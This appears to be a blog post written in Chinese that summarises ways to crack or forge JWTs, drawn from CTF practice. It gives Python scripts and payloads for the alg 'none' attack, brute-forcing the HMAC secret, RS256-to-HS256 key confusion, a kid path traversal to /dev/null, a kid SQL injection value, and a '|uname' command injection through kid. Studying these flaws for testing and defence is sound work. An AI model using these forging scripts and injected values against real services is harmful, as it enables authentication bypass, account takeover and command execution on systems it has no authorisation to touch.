---
title: 'JWT Crack总结 （一）'
date: 2022-11-24 23:06:39
tags: [jwt,ctf,Infosec]
published: true
hideInList: false
feature: 
isTop: false
---

## 场景总结

首先要明白，一个jwt是由三部分组成的：header，payload，signature。三个部分用 `.` 连接，用base64编码且格式要求去掉末尾的 `=`

其他额外需要知道的，例如header下有时会有叫 `kid` 的parameter，这个是key identifier的缩写，可被某些库用（如果没有妥善地处理，可以导致SQLi，Dir traversel .. 还有rce)。本文用到的例子里有写.

能够破解的方式总结的话有以下场景

- 不检查signature - 直接修改payload便好
  
- 加密可取消
  
- 加密方式可爆破
  
- 从公钥pem文件泄漏场景到RSA256转为HS256方式绕过签名
  
- 利用kid读取文件实现伪造身份
  
- 利用kid实现SQL注入
  
- 利用kid实现rce（CVE-2017-17405）
  

备注：

1. 出现的python脚本都仅供参考，都是刷题时临时写的，没有实现完全自动化。
  
2. 刷题遇到的坑和失败尝试这里就不写出来了，推荐最好还是找类似的实战场景去练习一下，才能更清楚jwt相关漏洞的具体利用思路和过程。
  
3. 部分不举例，例如直接修改payload
  

### 加密可取消

直接将header下的alg改为none，例如：

```
{



"alg": "none",



"typ": "JWS"



}
```

然后对header单独进行base64编码（注意去掉末尾的=）

我在刷题的时候，遇到了小写的 `none` 不成功的情况，改成大写的 `None` 就可以了。（但是后续看官方题解，好像小写的也可以，目前为止这块不是特别清楚。）

### 公钥泄漏

直接用python下的hmac&hashlib库，对header和body进行新的签名，参考我刷题时写的代码

```python
import base64



import hmac



import hashlib





with open('public.pem','rb') as f:



public_key = f.read()



print(public_key)



msg = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K'.encode('utf-8')



sig = base64.urlsafe_b64encode(hmac.new(public_key,msg,hashlib.sha256).digest()).decode('utf-8').rstrip('=')



# sig = base64.urlsafe_b64encode(hmac.new(bytes(public_key, encoding='utf-8'),msg,hashlib.sha256).digest()).decode('utf-8').rstrip('=')





print(type(msg))



print(msg.decode('utf-8') + '.' + sig)
```

### 加密方式可爆破

两种方法，一种用hashcat或者自己写脚本，以下是我写的python脚本

```python
import base64



import hmac



import hashlib



import json






jwt = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM'





def change_payload(jwt):



payload = jwt.split('.')[1]



orgin_p = json.loads(base64.b64decode(payload+'==').decode('utf-8'))



orgin_p['user']='admin'



changed_p = base64.b64encode(json.dumps(orgin_p).rstrip('=').encode('utf-8'))



return changed_p






def brute_sig(key,object):



new_sign = hmac.new(key, object, hashlib.sha256).digest()



return base64.urlsafe_b64encode(new_sign).decode('utf-8').rstrip('=')







header = jwt.split('.')[0]



payload = change_payload(jwt)



origin_sign = jwt.split('.')[-1]






brute_keys = ['hacker','jwt','insecurity','your-key','hacking'] #or read from file



for try_key in brute_keys:



target = ".".join(jwt.split('.')[:-1])



key = try_key.encode('utf-8')



if brute_sig(key, target.encode('utf-8')) == origin_sign:



print('[*]Brute sucess,the key is {}'.format(try_key))



new_target = "{}.{}".format(header.rstrip('='),payload.decode('utf-8').rstrip('='))



jwt = new_target + '.' + brute_sig(key, new_target.encode('utf-8')).rstrip('=')



print('[*]new jwt is: {}'.format(jwt))
```

### 从RSA256转为HS256方式绕过签名

关于该绕过最初的讨论https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/.

基于RSA256的加密的机制是非对称性的，它依赖于公钥去验证有效性，但是生成新的签名则需要私钥。而HMAC则在Sign和Verify上，使用的同一secret

在保证可以换加密方式的前提下（基于场景判断），例如，verfy签名时，调用方法`verify(public_key, data)` ，如果换成HMAC时，校验签名有效性时，使用的是同一scret，这就导致，我们使用HMAC 签名的token可以保证通过verify。

我的python脚本

```python
import base64

import hmac

import hashlib



with open('public.pem','rb') as f:

public_key = f.read()

print(public_key)

msg = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K'.encode('utf-8')

sig = base64.urlsafe_b64encode(hmac.new(public_key,msg,hashlib.sha256).digest()).decode('utf-8').rstrip('=')



print(type(msg))

print(msg.decode('utf-8') + '.' + sig)
```

### 利用kid读取文件实现伪造身份

可以利用kid进行新的有效签名

1. 提取header部分，将kid换成 `../../../../../../../../../dev/null`
  
2. 此时secret换成空
  
3. 进行sha256加密
  

参考脚本如下

```python
import hmac

import base64

import hashlib




changed_data = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4ifQ"

secret = "".encode('utf-8')




new_sign = hmac.new(secret,changed_data.encode('utf-8'),hashlib.sha256).digest()

new_sign = base64.urlsafe_b64encode(new_sign).decode('utf-8').rstrip('=')

print(changed_data + '.' + new_sign)
```

### 利用kid实现sql注入

原理是一样的，将kid使用

```
random-string ' UNION SELECT 'secret
```

然后生成签名时，使用`secret` 来生成。原理其实是和读取文件伪造身份是一样的。脚本也可以参考刚那个脚本

### 利用kid实现rce

例如CVE-2017-17405，是 Ruby library Net::FTP下的一个漏洞，会读取header下的kid的key-value，并且该过程发生在校验签名前。所以无需有效签名，即可实现任意文件读取&任意命令执行

关键函数调用有：

```
File.open(....)
```

```
open(....)
```

直接jwt.io解jwt，然后把header部分增加kid和对应的执行命令，例如：

```json
{



"typ": "JWT",



"alg": "HS256",



"kid": "|uname"



}
```

则会立刻执行对应命令

## Reference

- Pentesterlab 「推荐」 建议若能赶上黑五尾巴赶紧入一个pro
  
- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/.